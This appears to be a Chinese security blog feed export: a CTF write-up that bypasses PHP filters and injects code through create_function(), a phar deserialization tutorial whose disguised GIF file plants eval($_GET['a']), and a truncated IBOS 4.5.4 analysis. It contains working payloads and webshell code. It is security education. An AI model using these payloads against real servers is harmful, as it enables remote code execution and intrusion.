<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre>
<p>关于第一处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> </code></pre>
<p>关于<code>$_SERVER['QUERY_STRING']</code>.他验证的时候是不会进行url解码的，但是在GET的时候则会进行url解码，所以我们只需要将关键词编码就能绕过。’’</p>
<p>关于第二处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><code>preg_match</code>值匹配第一行，句尾加上%0a进行绕过，绕过<code>preg_match</code>主要有两种方法即换行符与PRCE回溯此处超出。</p>
<p>payload：<code>dedu=aqua_is_cute%0a</code></p>
<p>关于第三处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>  </code></pre>
<p><code>$_REQUEST</code>方式接收请求是存在优先级别的，如果同时接受GET和POST的数据，默认情况下POST具有优先权，所以只需要在get的同时post数字即可。</p>
<p>payload：<code>POST：debu=1&amp;file=1</code></p>
<p>关于第四处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<p>这里利用data协议即可：<code>file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61</code></p>
<p>与此同时file也需要被post一下。</p>
<p>关于第四处限制：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> </code></pre>
<p>这里利用数组进行一下绕过就可以了，因为当sha1()的参数为数组，此时就会返回false。</p>
<p>payload：<br> <code>shana[]=1&amp;passwd[]=2</code>  </p>
<p>关于第五处限制：  </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>这里利用到了<code>create_function()</code>代码注入。</p>
<p><code>create_function()</code>函数有两个参数$args和$code，用于创建一个lambda样式的函数</p>
<p>例如：<code>$myfunc = create_function('$a, $b', 'return $a+$b;');</code><br> 相当于：  </p>
<pre><code>function myfunc($a, $b){
    return $a+$b;
}    </code></pre>
<p>与此同时当第二个参数无限制时：</p>
<pre><code>$code=return $a+$b;}eval($_POST['cmd']);//</code></pre>
<p>就会变成：</p>
<pre><code>function myfunc($a, $b){
    return $a+$b;
}
eval($_POST['cmd']);//}  </code></pre>
<p>看到这道题，在上一阶段sha1比较的过程中，<code>extract($_GET["flag"]);</code>这里我们可以进行变量覆盖，从而掌控住arg变量与code变量。<br> 同时根据上面的介绍我们可以通过必和符号来执行自己定义的函数：  </p>
<pre><code>&amp;flag[arg]=}a();//&amp;flag[code]=create_function</code></pre>
<p>拼接过后就应该是：    </p>
<pre><code>function {}a();//}</code></pre>
<p>这样子了。  </p>
<p>这个a我们是可以随时改成其他的函数的。  </p>
<p>但是此时很多函数都被禁用了，文件中包含了flag这个文件，利用<code>get_defined_vars()</code>将所有变量与值都进行输出，此时payload就为：  </p>
<pre><code>flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></pre>
<p>输出出来但还不是真正的flag，提示我们是在另一个文件里面，flag4.php，此时我们可以利用require，来代替include，利用base64编码绕过flag的过滤，利用require()来代替require” “。  </p>
<p>payload：<code>flag[arg]=}require(base64_decode(xxxxxxx));var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></p>
<p>非预期解：利用异或或者~进行取反操作。</p>
<p>最终payload:<br> GET:</p>
<pre><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</code></pre>
<p>POST:</p>
<pre><code>debu=1&amp;file=1</code></pre>
<pre><code>/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e

file=1&amp;debu=2
</code></pre>
<pre><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
</code></pre>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP Phar原理学习</title>
    <url>/2021/07/23/phpsec/php-phar-yuan-li-xue-xi/php-phar-yuan-li-xue-xi/</url>
    <content><![CDATA[<h2 id="流包装"><a href="#流包装" class="headerlink" title="流包装"></a>流包装</h2><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p>
<pre><code>include('php://filter/read=convert.base64-encode/resource=index.php');
include('data://text/plain;base64,xxxxxxxxxxxx');</code></pre>
<p><code>phar://</code>也是流包装的一种</p>
<h2 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>压缩文件的属性等信息，以序列化存储。</p>
<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>压缩文件的内容。</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名，放在文件末尾。</p>
<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
<p>假设有test.php:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">Testobj</span>
<span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">"echo 'ok';"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>生成phar的test.phar:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//删除之前的test.par文件(如果有)</span>
    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个phar对象，文件名必须以phar为后缀</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始写文件</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//写入stub</span>
    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>  
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
    <span class="token comment" spellcheck="true">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>这样，当我们访问phar.phpr时，将会生成test.phar的phar文件。之后再将其作为参数传到test.php中，就可getshell</p>
<p>用winhex打开test.phar:</p>
<p><img src="/2021/07/23/phpsec/php-phar-yuan-li-xue-xi/php-phar-yuan-li-xue-xi/image-20210723025024180.png" alt="image-20210723025024180"></p>
<p>看到meta-data是以序列化的形式存储的</p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<p><img src="/2021/07/23/phpsec/php-phar-yuan-li-xue-xi/php-phar-yuan-li-xue-xi/image-20210723025147550.png" alt="image-20210723025147550"></p>
<h2 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h2><p>php识别__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//删除之前的test.par文件(如果有)</span>
    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个phar对象，文件名必须以phar为后缀</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始写文件</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>
    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>  
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>phar文件要能够上传到服务器端</li>
<li>要有可用的魔术方法作为“跳板”</li>
<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file()</li>
<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox">CISCN:2019-华北赛区-Dropbox</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><strong>文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</strong></li>
<li><strong>反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</strong></li>
</ul>
<p>参考：<a href="https://blog.csdn.net/silence1_/article/details/102683254">https://blog.csdn.net/silence1_/article/details/102683254</a></p>
<p>​            <a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>IBOS 4.5.4 命令执行分析</title>
    <url>/2022/09/18/phpsec/ibos-4.5.4-ming-ling-zhi-xing-fen-xi/ibos-4.5.4-ming-ling-zhi-xing-fen-xi/</url>
    <content><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>ibos &lt; 4.5.5</code></pre>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ibos4.5.5中 system\core\utils\database.php</p>
<p>![image-20220918155811032](IBOS 4.5.4 命令执行分析.assets/1.png)</p>
